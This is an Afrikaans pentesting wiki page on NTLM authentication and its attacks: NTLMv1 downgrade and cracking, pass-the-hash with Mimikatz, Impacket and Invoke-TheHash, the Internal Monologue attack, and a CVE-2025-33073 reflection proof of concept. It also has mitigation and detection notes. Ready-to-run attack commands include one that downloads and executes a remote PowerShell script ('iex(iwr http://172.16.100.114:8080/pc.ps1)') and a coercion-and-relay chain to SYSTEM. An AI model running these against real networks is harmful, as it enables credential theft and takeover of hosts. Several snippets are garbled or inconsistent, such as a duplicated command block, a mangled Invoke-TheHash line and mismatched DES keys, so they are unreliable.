# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Basiese inligting

In omgewings waar **Windows XP en Server 2003** gebruik word, word LM (Lan Manager)-hashes gebruik, hoewel dit algemeen bekend is dat hulle maklik gekompromitteer kan word. ’n Spesifieke LM-hash, `AAD3B435B51404EEAAD3B435B51404EE`, dui aan dat LM nie gebruik word nie; dit verteenwoordig die hash vir ’n leë string.

Die **Kerberos**-verifikasieprotokol is by verstek die primêre metode wat gebruik word. NTLM (NT LAN Manager) word in spesifieke omstandighede gebruik: wanneer Active Directory ontbreek, die domein nie bestaan nie, Kerberos weens verkeerde konfigurasie nie werk nie, of wanneer verbindings met ’n IP-adres eerder as ’n geldige gasheernaam probeer word.

Die teenwoordigheid van die **"NTLMSSP"**-kopskrif in netwerkpakkies dui op ’n NTLM-verifikasieproses.

Ondersteuning vir die verifikasieprotokolle LM, NTLMv1 en NTLMv2 word deur ’n spesifieke DLL by `%windir%\Windows\System32\msv1\_0.dll` verskaf.

**Kernpunte**:

- LM-hashes is kwesbaar, en ’n leë LM-hash (`AAD3B435B51404EEAAD3B435B51404EE`) dui aan dat dit nie gebruik word nie.
- Kerberos is die verstek-verifikasiemetode; NTLM word slegs onder sekere omstandighede gebruik.
- NTLM-verifikasiepakkies kan aan die "NTLMSSP"-kopskrif uitgeken word.
- LM-, NTLMv1- en NTLMv2-protokolle word deur die stelsellêer `msv1\_0.dll` ondersteun.

## LM, NTLMv1 en NTLMv2

Jy kan nagaan en instel watter protokol gebruik sal word:

### GUI

Voer _secpol.msc_ uit -> Plaaslike beleide -> Sekuriteitsopsies -> Netwerksekuriteit: LAN Manager-verifikasievlak. Daar is 6 vlakke (van 0 tot 5).

![LM, NTLMv1 and NTLMv2 - GUI: Execute secpol.msc - Local policies - Security Options - Network Security: LAN Manager authentication level. There are 6 levels (from 0 to 5)](<../../images/image (919).png>)

### Registry

Dit stel vlak 5 in:

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```

Moontlike waardes:

```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```

## Basiese NTLM-domeinverifikasieskema

1. Die **gebruiker** verskaf sy **credentials**
2. Die kliëntmasjien **stuur ’n verifikasieversoek** met die **domeinnaam** en die **gebruikersnaam**
3. Die **bediener** stuur die **challenge**
4. Die **kliënt versyfer** die **challenge** met die hash van die wagwoord as sleutel en stuur dit as response
5. Die **bediener stuur** die **domeinnaam, die gebruikersnaam, die challenge en die response** na die **domeinbeheerder**. As Active Directory nie opgestel **is nie**, of as die domeinnaam die naam van die bediener is, word die credentials **plaaslik nagegaan**.
6. Die **domeinbeheerder kyk of alles korrek is** en stuur die inligting na die bediener

Die **bediener** en die **domeinbeheerder** kan ’n **Secure Channel** via die **Netlogon**-bediener skep, aangesien die domeinbeheerder die bediener se wagwoord ken (dit is in die **NTDS.DIT**-databasis).

### Plaaslike NTLM-verifikasieskema

Die verifikasie is soos die een wat **hierbo genoem is, maar** die **bediener** ken die hash van die gebruiker wat probeer verifieer, omdat dit in die **SAM**-lêer is. Dus, in plaas daarvan om die domeinbeheerder te vra, sal die **bediener self nagaan** of die gebruiker kan verifieer.

### NTLMv1-challenge

Die **challenge is 8 grepe lank** en die **response is 24 grepe lank**.

Die **NT-hash (16 grepe)** word in **3 dele van 7 grepe elk** verdeel (7B + 7B + (2B+0x00\*5)): die **laaste deel word met nulle gevul**. Dan word die **challenge** afsonderlik met elke deel **versyfer**, en die **resulterende** versyferde grepe word **saamgevoeg**. Totaal: 8B + 8B + 8B = 24 grepe.

**Probleme**:

- Gebrek aan **willekeurigheid**
- Die 3 dele kan **afsonderlik aangeval** word om die NT-hash te vind
- **DES kan gekraak word**
- Die 3de sleutel bestaan altyd uit **5 nulle**.
- Met dieselfde **challenge** sal die **response** altyd dieselfde wees. Jy kan dus die string "**1122334455667788**" as **challenge** aan die slagoffer gee en die response aanval met behulp van **voorafberekende rainbow tables**.

### NTLMv1-aanval

Unconstrained delegation kom minder algemeen in moderne omgewings voor, maar ’n bereikbare **Print Spooler-diens** kan steeds misbruik word om ’n gasheer te dwing om te verifieer.

Jy kan sommige credentials/sessies wat jy reeds op die AD het, misbruik om **die drukker te vra om te verifieer** teen ’n **gasheer onder jou beheer**. Dan kan jy met `metasploit auxiliary/server/capture/smb` of `responder` **die verifikasie-challenge op 1122334455667788 stel**, die verifikasiepoging vasvang en, as dit met **NTLMv1** gedoen is, dit **kraak**.\
As jy `responder` gebruik, kan jy probeer om **die vlag `--lm` te gebruik** om die **verifikasie** te probeer **afgradeer**.\
_Let daarop dat die verifikasie vir hierdie tegniek met NTLMv1 uitgevoer moet word (NTLMv2 is nie geldig nie)._

Onthou dat die drukker die rekenaarrekening tydens die verifikasie sal gebruik, en rekenaarrekeninge **lang en willekeurige wagwoorde** gebruik wat jy **waarskynlik nie met algemene woordeboeke sal kan kraak nie**. Maar die **NTLMv1**-verifikasie **gebruik DES** ([meer inligting hier](#ntlmv1-challenge)), so jy sal dit kan kraak deur dienste te gebruik wat spesifiek vir die kraak van DES bedoel is (jy kan byvoorbeeld [https://crack.sh/](https://crack.sh) of [https://ntlmv1.com/](https://ntlmv1.com) gebruik).

### NTLMv1-aanval met hashcat

NTLMv1 kan ook aangeval word met [NTLMv1 Multi Tool](https://github.com/evilmog/ntlmv1-multi), wat vasgevangde NTLMv1-boodskappe omskakel na formate wat geskik is vir Hashcat.<sup>[[1]](#references)</sup>

Die opdrag

```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```

sou die volgende uitvoer:

```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```

Skep ’n lêer met die inhoud van:

```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```

Voer hashcat uit (verspreid is die beste met ’n hulpmiddel soos hashtopolis), aangesien dit andersins ’n paar dae sal neem.

```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```

In hierdie geval weet ons die wagwoord hiervoor is password, dus gaan ons vir demonstrasiedoeleindes kul:

```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```

Ons moet nou die hashcat-utilities gebruik om die gekraakte DES-sleutels na dele van die NTLM-hash om te skakel:

```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```

Laastens, die laaste deel:

```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```

Kombineer hulle saam:

```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```

### NTLMv2 Challenge

Die **challenge-lengte is 8 grepe** en **2 responses word gestuur**: Een is **24 grepe** lank en die lengte van die **ander** is **veranderlik**.

**Die eerste response** word geskep deur die **string** wat uit die **client en die domein** bestaan met **HMAC_MD5** te versyfer en die **MD4-hash** van die **NT-hash** as **sleutel** te gebruik. Die **resultaat** word dan as die **sleutel** gebruik om die **challenge** met **HMAC_MD5** te versyfer. ’n **Client challenge van 8 grepe** word hierby gevoeg. Totaal: 24 B.

**Die tweede response** word geskep deur **verskeie waardes** te gebruik (’n nuwe client challenge, ’n **tydstempel** om **replay attacks** te voorkom...)

As jy ’n **PCAP met ’n suksesvolle authentication-uitruiling** het, onttrek die domein, gebruikersnaam, server challenge en NTLMv2 response, formateer die vaslegging vir Hashcat en gebruik modus `5600` om te probeer om die wagwoord te herstel. Die geargiveerde praktiese deurloop behou die prosedure vir die onttrekking van pakketvelde, terwyl Hashcat se voorbeelde die formaat definieer wat tans aanvaar word.<sup>[[2]](#references)[[7]](#references)</sup>

## Pass-the-Hash

**Sodra jy die hash van die slagoffer het**, kan jy dit gebruik om jou **as die slagoffer voor te doen**.\
Jy moet ’n **hulpmiddel** gebruik wat die **NTLM-authentication met daardie hash uitvoer**, **of** jy kan ’n nuwe **sessionlogon** skep en daardie **hash** in die **LSASS** **inspuit**, sodat daardie **hash gebruik word wanneer enige NTLM-authentication uitgevoer word**. Dit is wat mimikatz met die laaste opsie doen.

**Onthou asseblief dat jy ook Pass-the-Hash-aanvalle met Computer-accounts kan uitvoer.**

### **Mimikatz**

**Moet as administrateur uitgevoer word**

```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```

Dit begin ’n proses onder die huidige plaaslike gebruiker, terwyl LSASS die verskafte geloofsbriewe met sy uitgaande netwerkaanmelding assosieer. Jy kan dan toegang tot netwerkhulpbronne kry as die verskafte gebruiker, soortgelyk aan `runas /netonly`, sonder om die gewone tekswagwoord te ken.

### Pass-the-Hash vanaf Linux

Jy kan kode-uitvoering op Windows-masjiene verkry deur Pass-the-Hash vanaf Linux te gebruik.\
[**Sien praktiese Pass-the-Hash-uitvoeringsvoorbeelde met Impacket PsExec.**](../lateral-movement/psexec-and-winexec.md#impacket-psexecpy-psexec-like)

### Impacket Windows-saamgestelde nutsmiddels

Jy kan[ Impacket-binaries vir Windows hier aflaai](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (In hierdie geval moet jy ’n opdrag spesifiseer; cmd.exe en powershell.exe is nie geldig om ’n interaktiewe shell te verkry nie)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Daar is verskeie ander Impacket-binaries...

### Invoke-TheHash

Jy kan die powershell-skripte hier kry: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Invoke-WMIExec

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Invoke-SMBClient

```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```

#### Invoke-SMBEnum

```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```

#### Invoke-TheHash

Hierdie funksie kombineer die voorafgaande modusse. Jy kan **verskeie hosts** deurgee, uitgesoekte teikens uitsluit en _SMBExec, WMIExec, SMBClient,_ of _SMBEnum_ kies. As jy **SMBExec** of **WMIExec** kies sonder ’n _**Command**_-parameter, kontroleer dit net of jy voldoende toestemmings het.

```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```

### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Moet as administrateur uitgevoer word**

Hierdie hulpmiddel doen dieselfde as mimikatz (verander LSASS-geheue).

```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```

### Handmatige Windows-afstanduitvoering met gebruikersnaam en wagwoord


{{#ref}}
../lateral-movement/
{{#endref}}

## Onttrekking van aanmeldbewyse vanaf ’n Windows-gasheer

Vir meer inligting, sien [**Stealing Windows Credentials**](../stealing-credentials/README.md).

## Internal Monologue attack

Die Internal Monologue Attack is ’n sluipende tegniek vir die onttrekking van aanmeldbewyse waarmee ’n aanvaller NTLM-hashes van ’n slagoffer se masjien kan verkry **sonder om direk met die LSASS-proses te kommunikeer**. Anders as Mimikatz, wat hashes direk uit geheue lees en dikwels deur eindpuntsekuriteitsoplossings of Credential Guard geblokkeer word, benut hierdie aanval **plaaslike oproepe na die NTLM-verifikasiepakket (MSV1_0) via die Security Support Provider Interface (SSPI)**. Die aanvaller **verlaag eers NTLM-instellings** (bv. LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic) om te verseker dat NetNTLMv1 toegelaat word. Daarna maak hulle hulle voor as bestaande gebruikertokens wat van lopende prosesse verkry is, en aktiveer hulle plaaslik NTLM-verifikasie om NetNTLMv1-antwoorde met ’n bekende uitdaging te genereer.<sup>[[4]](#references)</sup>

Nadat hierdie NetNTLMv1-antwoorde vasgelê is, kan die aanvaller die oorspronklike NTLM-hashes vinnig met **voorafberekende rainbow tables** herwin, wat verdere Pass-the-Hash-aanvalle vir laterale beweging moontlik maak. Van kardinale belang is dat die Internal Monologue Attack sluipend bly omdat dit nie netwerkverkeer genereer, kode inspuit of direkte geheuestortings aktiveer nie. Dit maak dit moeiliker vir verdedigers om op te spoor as tradisionele metodes soos Mimikatz.

As NetNTLMv1 nie aanvaar word nie — weens afgedwonge sekuriteitsbeleide — kan die aanvaller moontlik nie ’n NetNTLMv1-antwoord verkry nie.

Om hierdie geval te hanteer, is die Internal Monologue-nutsding opgedateer: Dit verkry dinamies ’n bedienertoken met `AcceptSecurityContext()` om steeds **NetNTLMv2-antwoorde vas te lê** as NetNTLMv1 misluk. Hoewel NetNTLMv2 baie moeiliker is om te kraak, bied dit steeds ’n moontlikheid vir relay-aanvalle of vanlyn brute-force in beperkte gevalle.

Die PoC is beskikbaar by **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.<sup>[[4]](#references)</sup>

## NTLM Relay and Responder

**Lees hier ’n meer gedetailleerde gids oor hoe om hierdie aanvalle uit te voer:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Ontleed NTLM-uitdagings uit ’n netwerkopname

**Jy kan** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide) **gebruik**

## NTLM & Kerberos *Reflection* via Serialized SPNs (CVE-2025-33073)

Windows bevat verskeie versagtingsmaatreëls wat *Reflection*-aanvalle probeer voorkom. In hierdie aanvalle word ’n NTLM- (of Kerberos-)verifikasie wat van ’n gasheer afkomstig is, na **dieselfde** gasheer teruggestuur om SYSTEM-regte te verkry.

Microsoft het die meeste openbare aanvalskettings met MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) en latere pleisters gebreek. **CVE-2025-33073** wys egter dat die beskermings steeds omseil kan word deur misbruik te maak van hoe die **SMB-kliënt Service Principal Names (SPNs) afkap** wat *marshalled* (geserialiseerde) teikeninligting bevat.<sup>[[5]](#references)[[6]](#references)</sup>

### TL;DR van die fout
1. ’n Aanvaller registreer ’n **DNS A-rekord** waarvan die etiket ’n marshalled SPN enkodeer – bv.
   `srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. Die slagoffer word gedwing om by daardie gasheernaam te verifieer (PetitPotam, DFSCoerce, ens.).
3. Wanneer die SMB-kliënt die teikenstring `cifs/srv11UWhRCAAAAA…` aan `lsasrv!LsapCheckMarshalledTargetInfo` deurgee, **stroop** die oproep na `CredUnmarshalTargetInfo` die geserialiseerde blob, wat **`cifs/srv1`** agterlaat.
4. `msv1_0!SspIsTargetLocalhost` (of die Kerberos-ekwivalent) beskou die teiken nou as *localhost* omdat die kort gasheerdeel ooreenstem met die rekenaarnaam (`SRV1`).
5. Gevolglik stel die bediener `NTLMSSP_NEGOTIATE_LOCAL_CALL` en voeg dit **LSASS se SYSTEM-toegangstoken** by die konteks (vir Kerberos word ’n SYSTEM-gemerkte subsessiesleutel geskep).
6. As daardie verifikasie met `ntlmrelayx.py` **of** `krbrelayx.py` afgelê word, kry die aanvaller volle SYSTEM-regte op dieselfde gasheer.<sup>[[5]](#references)</sup>

### Vinnige PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
          -a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
          -d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
             srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```

### Patches en versagtings
* KB-patch vir **CVE-2025-33073** voeg 'n kontrole by in `mrxsmb.sys::SmbCeCreateSrvCall` wat enige SMB-verbinding blokkeer waarvan die teiken gemarshalde inligting bevat (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).<sup>[[5]](#references)[[6]](#references)</sup>
* Dwing **SMB signing** af op SMB relay-bestemmings. Vir ander bestemmings, beoordeel die protokol se eie signing- of Extended Protection-vereistes en patchvlak; SMB signing alleen bepaal nie of 'n HTTPS WinRM relay moontlik is nie.
* Monitor DNS-rekords wat lyk soos `*<base64>...*` en blokkeer coercion-vektore (PetitPotam, DFSCoerce, AuthIP...).

### Opsporingsidees
* Netwerkopnames met `NTLMSSP_NEGOTIATE_LOCAL_CALL` waar die kliënt-IP ≠ bediener-IP.
* Kerberos AP-REQ wat 'n subsessiesleutel bevat en waar die kliënt-prinsipaal gelyk is aan die gasheernaam.
* Windows-gebeurtenis 4624/4648 SYSTEM-aanmeldings, onmiddellik gevolg deur afgeleë SMB-skryfbewerkings vanaf dieselfde gasheer.<sup>[[5]](#references)</sup>

'n Geserialiseerde DNS-naam met teikeninligting kan ook ge-coerce-de verifikasie na 'n aanvaller stuur vir 'n **cross-protocol relay** na 'n AD CS-webregistrasie-eindpunt. Dit is 'n afsonderlike uitkoms van reflection na dieselfde gasheer: die [ESC8-registrasievoorwaardes](../active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8), DNS-skryfreghte, 'n coercion-pad en die teiken se patchvlak moet onafhanklik beoordeel word.

Vir die plaaslike reflection-variant van **Maart 2026** wat **SMB arbitrary ports** en **TCP connection reuse** misbruik om `NT AUTHORITY\SYSTEM` te bereik, sien:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
- [1] [evilmog/ntlmv1-multi – NTLMv1-multigereedskap](https://github.com/evilmog/ntlmv1-multi)
- [2] [Hashcat-voorbeeldhashes – NetNTLMv2 (modus 5600)](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [3] [Kevin-Robertson/Invoke-TheHash – PowerShell Pass The Hash-hulpmiddels](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Internal Monologue Attack: Herwinning van NTLM-hashes sonder om aan LSASS te raak](https://github.com/eladshamir/Internal-Monologue)
- [5] [NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
- [7] [Kraak van 'n NTLMv2-hash – 801Labs (Internet Archive)](https://web.archive.org/web/20211206031936/http://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
{{#include ../../banners/hacktricks-training.md}}
